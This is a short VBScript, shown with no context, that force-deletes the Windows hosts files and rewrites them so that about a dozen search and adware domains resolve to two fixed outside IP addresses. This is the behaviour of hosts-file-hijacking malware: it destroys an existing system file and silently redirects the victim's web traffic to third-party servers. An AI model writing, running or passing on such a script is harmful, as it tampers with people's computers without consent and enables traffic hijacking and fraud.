Set fso = CreateObject("Scripting.FileSystemObject")
If fso.FileExists("C:\WINDOWS\hosts") = True Then 
fso.DeleteFile "C:\WINDOWS\hosts", True 
end if 
If fso.FileExists("C:\WINDOWS\system32\drivers\etc\hosts") = True Then 
fso.DeleteFile "C:\WINDOWS\system32\drivers\etc\hosts", True 
end if 
Set f = fso.CreateTextFile("C:\WINDOWS\hosts", ForWriting)
Set g = fso.CreateTextFile("C:\WINDOWS\system32\drivers\etc\hosts", ForWriting)
f.writeline("127.0.0.1  localhost")
g.writeline("127.0.0.1  localhost")
f.writeline("198.65.164.168  00hq.com")
g.writeline("198.65.164.168  00hq.com")
f.writeline("198.65.164.168  8ad.com")
g.writeline("198.65.164.168  8ad.com")
f.writeline("198.65.164.168  searchv.com")
g.writeline("198.65.164.168  searchv.com")
f.writeline("198.65.164.168  www.searchv.com")
g.writeline("198.65.164.168  www.searchv.com")
f.writeline("198.65.164.168  008k.com")
g.writeline("198.65.164.168  008k.com")
f.writeline("198.65.164.168  www.008k.com")
g.writeline("198.65.164.168  www.008k.com")
f.writeline ("198.65.164.170  bis.180solutions.com")
g.writeline ("198.65.164.170  bis.180solutions.com")
f.writeline ("198.65.164.170  bisads.180solutions.com")
g.writeline ("198.65.164.170  bisads.180solutions.com")
f.writeline ("198.65.164.170  www.orbitexplorer.com")
g.writeline ("198.65.164.170  www.orbitexplorer.com")
f.writeline ("198.65.164.170  www.sqwire.com")
g.writeline ("198.65.164.170  www.sqwire.com")
f.writeline ("198.65.164.170  www.traffichog.com")
g.writeline ("198.65.164.170  www.traffichog.com")
f.writeline ("198.65.164.170  www.commonname.com")
g.writeline ("198.65.164.170  www.commonname.com")
f.writeline ("198.65.164.170  allneedsearch.com")
g.writeline ("198.65.164.170  allneedsearch.com")
f.Close
g.Close
